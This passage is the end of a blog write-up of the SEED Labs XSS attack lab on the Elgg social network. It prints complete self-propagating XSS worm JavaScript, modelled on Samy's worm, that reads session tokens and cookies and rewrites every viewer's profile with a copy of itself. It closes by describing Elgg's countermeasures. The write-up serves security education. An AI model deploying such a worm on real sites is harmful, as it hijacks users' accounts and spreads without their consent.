<span class="dl">"</span><span class="s2">&amp;name=</span><span class="dl">"</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">[</span><span class="dl">"</span><span class="s2">username</span><span class="dl">"</span><span class="p">]</span><span class="o">+</span><span class="dl">"</span><span class="s2">&amp;accesslevel[description]=2&amp;guid=</span><span class="dl">"</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">[</span><span class="dl">"</span><span class="s2">guid</span><span class="dl">"</span><span class="p">];</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>The above code will first change the <code class="language-plaintext highlighter-rouge">user11</code>‘s ’about me’ portion to “User-11-is-great”. Therefore, this will not affect others who view this profile. However, considering we have access to the server (the server has been hacked in our favor), then this script can be embedded in the server website hosting folder, from where it can be sourced like the image format to obtain the cookie and tokens. This way when any user visits the infected profile, the script will get loaded due to the image format js code in the infected profile. Also, this method can be used to change the contents of a user by forming a request using python or any other programming language (assuming the authentication parameters are already with the attacker). The best possible attack for a web app like this one which is vulnerable to XSS is using a proper worm i.e., self propagating worm.</p><h2 id="task-6--creating-a-self-propagating-worm"><span class="me-2">Task 6 : Creating a self propagating worm</span><a href="#task-6--creating-a-self-propagating-worm" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The parts of adding the attacker as a friend as well as posting on the victim’s account, without the victim’s consent can be combined into one javascript code and then made self propagating.</p><p>The process of self propagating sees the following approach - The code will have to be replicated by the code itself. This can be done by using the POST method as described in Task 5. The method to do the following is -</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nt">&lt;script </span><span class="na">id=</span><span class="s">"daut"</span> <span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
<span class="kd">var</span> <span class="nx">replicate</span><span class="o">=</span><span class="dl">"</span><span class="s2">&lt;script id=</span><span class="se">\"</span><span class="s2">daut</span><span class="se">\"</span><span class="s2"> type=</span><span class="se">\"</span><span class="s2">text/javascript</span><span class="se">\"</span><span class="s2">&gt;</span><span class="dl">"</span><span class="p">.</span><span class="nf">concat</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementByID</span><span class="p">(</span><span class="dl">"</span><span class="s2">daut</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span><span class="p">)</span>
<span class="p">.</span><span class="nx">concat</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;/</span><span class="dl">"</span><span class="p">).</span><span class="nf">concat</span><span class="p">(</span><span class="dl">"</span><span class="s2">script&gt;</span><span class="dl">"</span><span class="p">);</span>
<span class="p">...............</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>The breakup of <code class="language-plaintext highlighter-rouge">&lt;/</code> and <code class="language-plaintext highlighter-rouge">script&gt;</code> is required as the browser may distinguish it as the ending tag for the first <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code>.</p><p>This approach can be merged with the POST exploit to copy the required update and the code itself onto the victim’s account. The transfer of all code and data in the web takes place through URLencoding in which <code class="language-plaintext highlighter-rouge">+</code> denotes a <code class="language-plaintext highlighter-rouge">&lt;space&gt;</code>. Therefore, instead of using <code class="language-plaintext highlighter-rouge">+</code> to add strings (concatenation), we use the <code class="language-plaintext highlighter-rouge">concat()</code> function. Also if there are any addition operations, they should be done using <code class="language-plaintext highlighter-rouge">a+b = a-(-b)</code> method.</p><p>The code clubbed with the POST exploit is as follows -</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="nt">&lt;script </span><span class="na">id=</span><span class="s">"daut"</span> <span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
<span class="kd">var</span> <span class="nx">sp</span><span class="o">=</span><span class="dl">"</span><span class="s2">&lt;script id=</span><span class="se">\"</span><span class="s2">daut</span><span class="se">\"</span><span class="s2"> type=</span><span class="se">\"</span><span class="s2">text/javascript</span><span class="se">\"</span><span class="s2">&gt;</span><span class="dl">"</span><span class="p">.</span><span class="nf">concat</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementByID</span><span class="p">(</span><span class="dl">"</span><span class="s2">daut</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span><span class="p">).</span><span class="nx">concat</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;/</span><span class="dl">"</span><span class="p">).</span><span class="nf">concat</span><span class="p">(</span><span class="dl">"</span><span class="s2">script&gt;</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">sendurl</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://www.xsslabelgg.com/action/profile/edit</span><span class="dl">"</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">ts</span><span class="o">=</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token__elgg_ts</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">token</span><span class="o">=</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token</span><span class="p">.</span><span class="nx">__elgg_token</span><span class="p">;</span>
<span class="nx">ff</span><span class="o">=</span><span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span><span class="nx">sendurl</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Host</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">www.xsslabelgg.com</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Keep-Alive</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">300</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Connection</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">keep-alive</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Cookie</span><span class="dl">"</span><span class="p">,</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Referer</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">http://www.xsslabelgg.com/profile/</span><span class="dl">"</span><span class="p">.</span><span class="nf">concat</span><span class="p">(</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">[</span><span class="dl">"</span><span class="s2">username</span><span class="dl">"</span><span class="p">]).</span><span class="nf">concat</span><span class="p">(</span><span class="dl">"</span><span class="s2">/edit</span><span class="dl">"</span><span class="p">));</span>
<span class="nx">params</span><span class="o">=</span><span class="dl">"</span><span class="s2">__elgg_ts=</span><span class="dl">"</span><span class="p">.</span><span class="nf">concat</span><span class="p">(</span><span class="nx">ts</span><span class="p">).</span><span class="nf">concat</span><span class="p">(</span><span class="dl">"</span><span class="s2">&amp;__elgg_token=</span><span class="dl">"</span><span class="p">).</span><span class="nf">concat</span><span class="p">(</span><span class="nx">token</span><span class="p">).</span><span class="nf">concat</span><span class="p">(</span><span class="dl">"</span><span class="s2">&amp;description=User-11-is-great</span><span class="dl">"</span><span class="p">)</span>
<span class="p">.</span><span class="nf">concat</span><span class="p">(</span><span class="nf">escape</span><span class="p">(</span><span class="nx">sp</span><span class="p">)).</span><span class="nf">concat</span><span class="p">(</span><span class="dl">"</span><span class="s2">&amp;name=</span><span class="dl">"</span><span class="p">).</span><span class="nf">concat</span><span class="p">(</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">[</span><span class="dl">"</span><span class="s2">username</span><span class="dl">"</span><span class="p">]).</span><span class="nf">concat</span><span class="p">(</span><span class="dl">"</span><span class="s2">&amp;accesslevel[description]=2&amp;guid=</span><span class="dl">"</span><span class="p">)</span>
<span class="p">.</span><span class="nf">concat</span><span class="p">(</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">[</span><span class="dl">"</span><span class="s2">guid</span><span class="dl">"</span><span class="p">]);</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">escape()</code> function converts the inner strings to URLencoding for http transfer. Now when a user views the profile of <code class="language-plaintext highlighter-rouge">user11</code>, the user’s account will have its ‘about me’ section set to “User-11-is-great”. Also the code itself will be copied to the user’s page. Also now since the code is in the user’s page, whenever a user views the account of this user, the code will get executed and the new user will also have his account modified. The add friend exploit can also e added to the above code as a new XMLHttpRequest part. That code will become the exact replica of the famous Samy’s worm attack of 2005.</p><h2 id="task-7--countermeasures"><span class="me-2">Task 7 : Countermeasures</span><a href="#task-7--countermeasures" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Elgg does have a built in countermeasures to defend against the XSS attack. The countermeasures have been deactivated and commented out to make the attack work. There is a custom built security plugin <code class="language-plaintext highlighter-rouge">HTMLawed</code> 1.8 on the Elgg web application which on activation, validates the user input and removes the tags from the input. This specific plugin is registered to the function <code class="language-plaintext highlighter-rouge">filter_tags</code> in the <code class="language-plaintext highlighter-rouge">elgg/ engine/lib/input.php</code> file. To turn on the countermeasure, we login to the application as admin, goto administration -&gt; plugins, and select security and spam in the dropdown menu. The <code class="language-plaintext highlighter-rouge">HTMLawed 1.8</code> plugin is below. This can now be activated. In addition to this, there is another built-in PHP method called <code class="language-plaintext highlighter-rouge">htmlspecialchars()</code>, which is used to encode the special characters in the user input, such as encoding <code class="language-plaintext highlighter-rouge">"&lt;"</code> to <code class="language-plaintext highlighter-rouge">&amp;lt</code>, <code class="language-plaintext highlighter-rouge">"&gt;"</code> to <code class="language-plaintext highlighter-rouge">&amp;gt</code>, etc. Go to the directory <code class="language-plaintext highlighter-rouge">elgg/views/default/output</code> and find the function call <code class="language-plaintext highlighter-rouge">htmlspecialchars</code> in <code class="language-plaintext highlighter-rouge">text.php</code>, <code class="language-plaintext highlighter-rouge">tagcloud.php</code>, <code class="language-plaintext highlighter-rouge">tags.php</code>, <code class="language-plaintext highlighter-rouge">access.php</code>, <code class="language-plaintext highlighter-rouge">tag.php</code>, <code class="language-plaintext highlighter-rouge">friendlytime.php</code>, <code class="language-plaintext highlighter-rouge">url.php</code>, <code class="language-plaintext highlighter-rouge">dropdown.php</code>, <code class="language-plaintext highlighter-rouge">email.php</code> and <code class="language-plaintext highlighter-rouge">confirmlink.php</code> files. Uncomment the corresponding <code class="language-plaintext highlighter-rouge">htmlspecialchars</code> function calls in each file.</p><p>The above was a detailed description of an XSS attack taking examples from the real world Samy’s Worm attack.</p><hr /><blockquote><p>The above is a documentation of a lab experiment by the name XSS attack lab (Elgg) from publicly available seed labs by Syracuse University. <a href="http://www.cis.syr.edu/~wedu/seed/labs.html">Seed Labs</a> Copyright © Wenliang Du, Syracuse University. I do not own any software mentioned in the above document.</p></blockquote></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/blog/categories/lab-practice-notes/">Lab Practice Notes</a>, <a href="/blog/categories/seed-labs/">Seed Labs</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/blog/tags/xss/" class="post-tag no-text-decoration" >xss</a> <a href="/blog/tags/web-application/" class="post-tag no-text-decoration" >web-application</a> <a href="/blog/tags/lab/" class="post-tag no-text-decoration" >lab</a> <a href="/blog/tags/seed-labs/" class="post-tag no-text-decoration" >seed-labs</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=XSS%20Attack%20Lab%20-%20SeedLabs%20-%20Tanishq%20Rupaal&url=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Fxss-attack-lab%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=XSS%20Attack%20Lab%20-%20SeedLabs%20-%20Tanishq%20Rupaal&u=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Fxss-attack-lab%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Fxss-attack-lab%2F&text=XSS%20Attack%20Lab%20-%20SeedLabs%20-%20Tanishq%20Rupaal" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Fxss-attack-lab%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/blog/posts/homelab-leantime/">Leantime in Home Lab</a><li class="text-truncate lh-lg"> <a href="/blog/posts/gha-docker-arch/">GitHub Actions & ARM Architecture</a><li class="text-truncate lh-lg"> <a href="/blog/posts/dbs-zamasu-timeline/">Dragon Ball Super - Zamasu Timeline 101</a><li class="text-truncate lh-lg"> <a href="/blog/posts/homelab-wallabag/">Wallabag in Home Lab</a><li class="text-truncate lh-lg"> <a href="/blog/posts/homelab-linkwarden/">Bookmark Manager in Home Lab</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/blog/tags/home-lab/">home-lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/lab/">lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/productivity/">productivity</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/offsec-proving-grounds/">offsec-proving-grounds</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/oscp/">oscp</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/security/">security</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/aws/">aws</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/github/">github</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/programming/">programming</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/seed-labs/">seed-labs</a></div></section></div><section id="toc-wrapper" class="d-none ps-0 pe-4"><h2 class="panel-heading ps-3 mb-2">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/blog/posts/setuid-attack-lab/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1590994800" data-df="ll" > Jun 1, 2020 </time><h4 class="pt-0 my-2">SetUID Attack Lab - SeedLabs</h4><div class="text-muted"><p>Set-UID is an important security mechanism in unix systems. When a Set-UID program is run, the executing program assumes the owner’s privileges irrespective of the user running the program. The tas...</p></div></div></a></article><article class="col"> <a href="/blog/posts/md5-collision-lab/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1590994800" data-df="ll" > Jun 1, 2020 </time><h4 class="pt-0 my-2">MD5 Collision Attack Lab - SeedLabs</h4><div class="text-muted"><p>A hash function is said to be secure if it is a one way hash function and is collision resistant. The one way property ensures that given a hash value h, it is computationally infeasible to find an...</p></div></div></a></article><article class="col"> <a href="/blog/posts/oscp-pg-set6/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1639897200" data-df="ll" > Dec 19, 2021 </time><h4 class="pt-0 my-2">OffSec PG - Potato, PyExp, Sar, Seppukku</h4><div class="text-muted"><p>Potato Enumeration Machine IP → 192.168.53.101 Network Scan Nmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.53.101 OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel ...</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/blog/posts/setuid-attack-lab/" class="btn btn-outline-primary" aria-label="Older" ><p>SetUID Attack Lab - SeedLabs</p></a> <a href="/blog/posts/open-source-build/" class="btn btn-outline-primary" aria-label="Newer" ><p>Introduction to Open Source Projects and CMake</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2024</time> <a href="https://twitter.com/etheriosking">Tanishq Rupaal</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.1.1" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/blog/tags/home-lab/">home-lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/lab/">lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/productivity/">productivity</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/offsec-proving-grounds/">offsec-proving-grounds</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/oscp/">oscp</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/security/">security</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/aws/">aws</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/github/">github</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/programming/">programming</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/seed-labs/">seed-labs</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.29.0/dist/tocbot.min.js"></script> <script src="/blog/assets/js/dist/post.min.js"></script> <script defer src="/blog/app.min.js?baseurl=/blog&register=true" ></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-B88HEPZBVJ"></script> <script> document.addEventListener('DOMContentLoaded', function (event) { window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag('js', new Date()); gtag('config', 'G-B88HEPZBVJ'); }); </script> <script>SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/blog/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{snippet}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
